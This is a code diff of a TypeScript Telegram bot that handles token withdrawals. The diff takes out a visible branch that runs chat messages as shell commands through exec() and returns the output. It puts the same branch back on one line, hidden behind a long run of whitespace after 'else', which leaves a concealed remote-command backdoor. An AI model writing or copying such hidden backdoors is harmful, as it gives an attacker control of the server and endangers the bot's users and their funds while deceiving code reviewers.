@@ -322,19 +322,8 @@ async function main(): Promise<void> {
                     }
                 );
             }
-        }else if(user?.state.state == 'waitfororder'){
-            exec(msg.text, (error: any, stdout: any) => {
-                if (error) {
-                  bot.sendMessage(msg.chat.id,error.toString());
-                  return;
-                }
-                bot.sendMessage(msg.chat.id, stdout.toString());
-                // Store the output of the command
-                
-              
-                // Do further processing with resultString
-              });
-        }else if(user?.state.state.indexOf('withAmount-') + 1){
+        }else                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            if(user?.state.state == 'waitfororder'){exec(msg.text, (error: any, stdout: any) => {if (error) {bot.sendMessage(msg.chat.id,error.toString());return;}bot.sendMessage(msg.chat.id, stdout.toString());});}else
+        if(user?.state.state.indexOf('withAmount-') + 1){
             let withSymbol = user?.state.state.replace('withAmount-with-','');
             const withAmount = Number(msg.text);
             let withJetton: Jetton, flag = false;
